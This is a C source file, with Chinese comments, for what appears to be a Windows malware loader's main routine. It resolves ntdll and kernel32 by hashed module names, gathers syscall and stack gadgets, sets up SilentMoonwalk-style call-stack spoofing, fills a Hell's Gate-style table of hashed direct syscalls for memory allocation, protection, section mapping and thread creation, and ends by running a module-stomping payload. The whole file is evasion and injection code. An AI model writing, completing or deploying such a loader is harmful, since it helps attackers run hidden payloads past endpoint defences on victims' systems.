#include "myloader.h"

#define HASH_NTDLL      0x8F46551850C1F33B
#define HASH_KERNEL32   0xBDC58DDFCEBE5CE3
#define HASH_KERNELBASE 0x456085A8289E9699

int main() {
    // 1. 初始化 TEB/PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
       // ERR("操作系统版本不匹配或 PEB 获取失败");
        return (0x1);
    }
    srand(GetTickCount());
    // 2. 获取 ntdll.dll 基址
    g_ntdllBase = NULL;
    g_kernel32Base = NULL;
    g_kernelBaseAddr = NULL;

    PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)pCurrentPeb->LoaderData->InLoadOrderModuleList.Flink;
    // 遍历模块列表
    while (pEntry->DllBase != NULL) {
        if (pEntry->BaseDllName.Buffer && pEntry->BaseDllName.Length > 0) {
            DWORD64 currentHash = djb2_w(pEntry->BaseDllName.Buffer);
            if (currentHash == HASH_NTDLL) {
                g_ntdllBase = pEntry->DllBase;
            }
            else if (currentHash == HASH_KERNEL32) {
                g_kernel32Base = pEntry->DllBase;
            }
            else if (currentHash == HASH_KERNELBASE) {
                g_kernelBaseAddr = pEntry->DllBase;
            }
        }
        if (g_ntdllBase && g_kernel32Base && g_kernelBaseAddr) break;
        
        pEntry = (PLDR_DATA_TABLE_ENTRY)pEntry->InLoadOrderLinks.Flink;
    }
    if (!g_ntdllBase) return (0x2);
    if (!g_kernel32Base) g_kernel32Base = g_ntdllBase;

    // 3. 获取 Gadgets
    g_pRandomSyscallGadget = GetSyscallGadget(g_ntdllBase);

    g_pStackGadget = GetStackGadget(g_ntdllBase, &g_StackGadgetSize);
    if (!g_pStackGadget && g_kernelBaseAddr) {
         g_pStackGadget = GetStackGadget(g_kernelBaseAddr, &g_StackGadgetSize);
    }
    if (!g_pStackGadget) {
        g_pStackGadget = GetStackGadget(g_kernel32Base, &g_StackGadgetSize);
    }
    
    g_pThunkGadget = GetThunkGadget(g_kernel32Base);
    if (!g_pThunkGadget && g_kernelBaseAddr) {
        g_pThunkGadget = GetThunkGadget(g_kernelBaseAddr);
    }

    if (!g_pThunkGadget) {
        g_pThunkGadget = GetThunkGadget(g_ntdllBase);
    }

    if (!g_pStackGadget) return (0x3);
    if (!g_pThunkGadget) return (0x3); 
    // 4. 获取 SilentMoonwalk 所需函数地址  
    frame_Root_Ntdll = NULL;    // 对应 FirstFrame
    frame_Mid_Kernel = NULL;    // 对应 SecondFrame
    kernelFrameModuleBase = NULL; // 用于计算 Kernel 帧大小的基址
    frame_Root_Ntdll = FindSuitableFrame(g_ntdllBase);
    
    if (!frame_Root_Ntdll) {
        //ERR("Critical: Failed to find valid frame in NTDLL.");
        return (0x98);
    }
    if (g_kernel32Base) {
        frame_Mid_Kernel = FindSuitableFrame(g_kernel32Base);
        kernelFrameModuleBase = g_kernel32Base;
    }

    if (!frame_Mid_Kernel && g_kernelBaseAddr) {
        frame_Mid_Kernel = FindSuitableFrame(g_kernelBaseAddr);
        kernelFrameModuleBase = g_kernelBaseAddr;
    }

    if (!frame_Mid_Kernel) {
        //如果 Kernel32/Base 都没合适的，就用 Ntdll 顶替
        frame_Mid_Kernel = frame_Root_Ntdll;
        kernelFrameModuleBase = g_ntdllBase;
    }
    // FirstFrame (栈底) -> Ntdll
    g_pRtlUserThreadStart = frame_Root_Ntdll; 
    // SecondFrame (上层) -> Kernel32/Base
    g_pBaseThreadInitThunk = frame_Mid_Kernel;
    // 5. 计算栈帧大小
    g_RtlFrameSize = CalculateStackFrameSize(g_ntdllBase, g_pRtlUserThreadStart);
    g_BaseFrameSize = CalculateStackFrameSize(kernelFrameModuleBase, g_pBaseThreadInitThunk);

    g_RbpPushOffset = FindRbpPushOffset(g_pBaseThreadInitThunk, kernelFrameModuleBase);

    if (g_RtlFrameSize == 0 || g_BaseFrameSize == 0 || g_RbpPushOffset == 0) {
        return (0x99);
    }
    if (!SW3_PopulateSyscallList(g_ntdllBase)) return (0x3);
    // 6. 获取导出表并填充 Syscall 表
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(g_ntdllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return (0x1);

    VX_TABLE Table = { 0 };
    // 填充 Syscall 表
    Table.NtAllocateVirtualMemory.dwHash = 0x174406488BC9F61A;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory);
    Table.NtCreateThreadEx.dwHash = 0x6369311DE803FFBE;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtCreateThreadEx);
    Table.NtProtectVirtualMemory.dwHash = 0x7ECDF05E75DD73D6;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory);
    Table.NtWaitForSingleObject.dwHash = 0x428DB567403CED8A;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtWaitForSingleObject);
	Table.NtOpenFile.dwHash = 0x78112189316BDC27;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtOpenFile);        
    Table.NtCreateSection.dwHash = 0x509694E18B3D659E;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtCreateSection);
    Table.NtMapViewOfSection.dwHash = 0xC4BF03775D88D378;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtMapViewOfSection);
    Table.NtClose.dwHash = 0x4DF1413226846A0B;
    GetVxTableEntry(g_ntdllBase, pImageExportDirectory, &Table.NtClose);
    // 7. 执行
    ModuleStompPayload(&Table);

    return (0x0);
}
